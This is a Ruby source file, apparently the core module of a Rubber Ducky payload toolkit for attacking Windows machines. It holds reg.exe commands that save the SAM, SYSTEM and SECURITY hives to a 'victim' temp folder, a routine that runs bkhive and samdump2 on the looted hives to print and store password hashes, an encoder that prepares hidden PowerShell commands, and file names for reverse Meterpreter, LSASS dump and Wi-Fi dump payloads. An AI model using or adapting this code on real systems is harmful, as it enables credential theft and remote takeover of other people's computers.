#!/usr/bin/env ruby
require 'fileutils'
require 'open3'
require 'readline'
module Core
  module Commands
    def print_error(text)
      puts "\e[31;1m[-]\e[0m #{text}"
    end

    def print_info(text)
      puts "\e[34;1m[*]\e[0m #{text}"
    end

    def print_success(text)
      puts "\e[32;1m[+]\e[0m #{text}"
    end

    def rgets(prompt = ' ', default_value = '')
      line = Readline.readline(prompt, false)
      line = default_value if line.empty?
      line
    end

    def encode_command(command)
      Base64.encode64(command.encode('utf-16le')).delete("\r\n")
    end

    def random_name_gen
      random_length = rand(4..8)
      file_name = random_length.to_i.times.map do
        [*'a'..'z', *'A'..'Z', *'0'..'9'].sample
      end.join
      file_name
    end

    def print_hashes(x)
      samdump_path, samdump_status = Open3.capture2('which samdump2')
      bkhive_path, bkhive_status = Open3.capture2('which bkhive')
      print_error("Can't find samdump2!\n") if samdump_status.to_s =~ /exit 1/
      print_error("Can't find bkhive!\n") if bkhive_status.to_s =~ /exit 1/
      if samdump_status.to_s =~ /exit 0/ and bkhive_status.to_s =~ /exit 0/
        Open3.capture2("#{bkhive_path.chomp} #{loot_dir}sys#{x} #{loot_dir}sys_key#{x}.txt")
        sam_dump,sam_exit = Open3.capture2("#{samdump_path.chomp} #{loot_dir}sam#{x} #{loot_dir}sys_key#{x}.txt")
        print_success("Printing Hashes!\n")
        puts sam_dump
        File.open("#{loot_dir}hashes#{x}.txt",'w') {|f| f.write(sam_dump)}
      else
        print_error("Can't dump local hashes!\n")
      end
    end
  end

  module Files
    def file_root
      File.expand_path(File.dirname($PROGRAM_NAME))
    end

    def text_path
      unless Dir.exist?(file_root + '/text_files/')
        Dir.mkdir(file_root + '/text_files/')
      end
      file_root + '/text_files/'
    end

    def duck_encode_file
      file_root + '/duck_encoder/'
    end

    def language_dir
      duck_encode_file + '/resources/'
    end

    def loot_dir
      file_root + '/loot/'
    end

    def reverse_meterpreter_file
      'powershell_reverse_ducky.txt'
    end

    def fast_meterpreter_file
      'fast_meterpreter_ducky.txt'
    end

    def hash_dump_file
      'hashdump_tcp.txt'
    end

    def lsass_dump_file
      'lsassdump_tcp.txt'
    end

    def wifi_dump_file
      'wifidump_tcp.txt'
    end

    def wget_file
      'wget_powershell.txt'
    end

    def hex_to_bin_file
      'hex_to_bin.txt'
    end

    def reg_folder
      'c:\\windows\\temp\\reg\\'
    end

    def cert_dir
      file_root + '/certs/'
    end

    def save_sam
      "reg.exe save HKLM\\SAM #{reg_folder}sam"
    end

    def save_sys
      "reg.exe save HKLM\\SYSTEM #{reg_folder}sys"
    end

    def save_sec
      "reg.exe save HKLM\\SECURITY #{reg_folder}sec"
    end

    def victim_path
      'c:\\windows\\temp'
    end

    def temp_path
      'c:\\windows\\temp\\test.txt'
    end
  end
end
